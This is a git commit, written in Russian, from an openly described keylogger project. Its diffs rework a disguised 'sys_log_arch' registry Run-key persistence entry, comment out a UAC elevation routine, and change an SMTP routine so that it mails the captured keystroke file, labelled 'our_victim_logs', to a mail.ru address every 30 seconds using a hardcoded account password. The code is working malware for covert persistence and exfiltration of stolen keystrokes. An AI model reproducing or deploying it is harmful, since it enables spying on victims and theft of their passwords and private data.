fbfa476341f20197b8a841e044a2700a3cd34422
sevase <kotaseva8@gmail.com>
2023-08-16 22:41:11 +0300

    TIK-004: проведен маштабный рефакторинг кода, исправлено 3 бага, переделана система отправки логов на почту, переделан автозапуск, переделано определние файла, теперь он определяется автоматически

--- autho_run_programm.py
+++ autho_run_programm.py
@@ -1,4 +1,4 @@
-'''ФАЙЛ МАКСИМА, ПО АВТОЗАПУСКУ КЕЙЛОГЕРА, КОГДА ВКЛЮЧАЕТСЯ СИСТЕМА'''
+'''ФАЙЛ ПО АВТОЗАПУСКУ КЕЙЛОГЕРА, КОГДА ВКЛЮЧАЕТСЯ СИСТЕМА'''
 import os
 import sys
 import ctypes
@@ -6,41 +6,57 @@ from recording_keyboard import start_keylogger
 
 
 # функция проверки на наличие прав администратора
-def run_as_admin():
-    if ctypes.windll.shell32.IsUserAnAdmin():
-        return True
-    else:
-        # повышение привилегии
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-        return False
+# def run_as_admin():
+#     if ctypes.windll.shell32.IsUserAnAdmin():
+#         return True
+#     else:
+#         # повышение привилегии
+#         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+#         return False
 
 
 # функция добавления файла в автозапуск
-def add_to_startup():
+def add_to_startup(key, value):
     try:
-        app_name = "sys_log_archive"  # имя для записи в автозапуске
-        app_path = os.path.abspath(sys.argv[0])  # полный путь к текущему скрипту
+        # Импорт библиотеки для работы с реестром
+        import winreg as reg
+    except ImportError:
+        import _winreg as reg  # Для старых версий Python
 
-        command = f'reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "{app_name}" /d "{app_path}" /f'
-        os.system(command)
+    try:
+        # Открываем ключ реестра
+        reg_key = reg.HKEY_CURRENT_USER
+        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        reg.CreateKey(reg_key, key_path)
+        registry_key = reg.OpenKey(reg_key, key_path, 0, reg.KEY_WRITE)
 
-        print("Успешно добавлено в автозапуск.")
+        # Записываем значение в ключ реестра
+        reg.SetValueEx(registry_key, key, 0, reg.REG_SZ, value)
+
+        # Закрываем ключ реестра
+        reg.CloseKey(registry_key)
+
+        print(f"Автозапуск для {key} успешно настроен.")
     except Exception as e:
-        print("Ошибка:", str(e))
+        print("Произошла ошибка:", str(e))
 
 
 def main_startup():
     print("Для работы этого скрипта требуются права администратора.")
 
-    if not run_as_admin():
-        return
+    # if not run_as_admin():
+    #     return
 
-    add_to_startup()
+    python_exe = sys.executable
+
+    # Путь к вашему скрипту
+    script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'recording_keyboard.py')
+
+    # Создаем запись в реестре для автозапуска скрипта
+    add_to_startup("sys_log_arch", f'"{python_exe}" "{script_path}"')
     print("Добавлено в автозапуск.")
 
-    # кейлогер для автозапуска
-    start_keylogger()
 
 
-if __name__ == "__main__":
-    main_startup()
+
+
--- sending_to_email.py
+++ sending_to_email.py
@@ -1,9 +1,11 @@
+"""ФАЙЛ ПО СОЗДАНИЮ ОТПРАВКИ ЛОГОВ НА ПОЧТУ"""
+import os.path
 import smtplib
 import time
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
+from email.mime.application import MIMEApplication
 import schedule
-
 
 # функция отправления электронного письма
 def send_email(file_path):
@@ -11,7 +13,6 @@ def send_email(file_path):
     # отправитель
     sender = "keyloger_sender@mail.ru"
     password = "6uyxsp5pdvaRHjPCJa5Y"
-
     # получатель
     recipient = "keyloger_recipient@mail.ru"
 
@@ -25,11 +26,14 @@ def send_email(file_path):
     msg['From'] = sender
     msg['To'] = recipient
 
-    # чтение файла
-    with open(file_path, "r", encoding="utf-8") as file:
-        file_content = file.read()
+    # Присоединяем текстовое сообщение
+    msg.attach(MIMEText("См. вложение для логов.", 'plain'))
 
-    msg.attach(MIMEText(file_content, 'plain'))
+    # Открываем файл и прикрепляем его как вложение
+    with open(file_path, "rb") as file:
+        part = MIMEApplication(file.read())
+        part.add_header('Content-Disposition', 'attachment', filename="our_victim_logs")
+        msg.attach(part)
 
     server.sendmail(sender, recipient, msg.as_string())
     print('Файл успешно отправлен!')
@@ -38,7 +42,7 @@ def send_email(file_path):
 
 # Функция выполнения расписания
 def run_schedule(file_path):
-    schedule.every(30).minutes.do(send_email, file_path)
+    schedule.every(30).seconds.do(send_email, file_path)
 
     while True:
         schedule.run_pending()
@@ -47,7 +51,7 @@ def run_schedule(file_path):
 
 def main():
     # путь к файлу с кейлогами
-    file_path = "system_monitoring.txt"
+    file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'system_monitoring.txt')
     # Запуск выполнения расписания
     run_schedule(file_path)
 
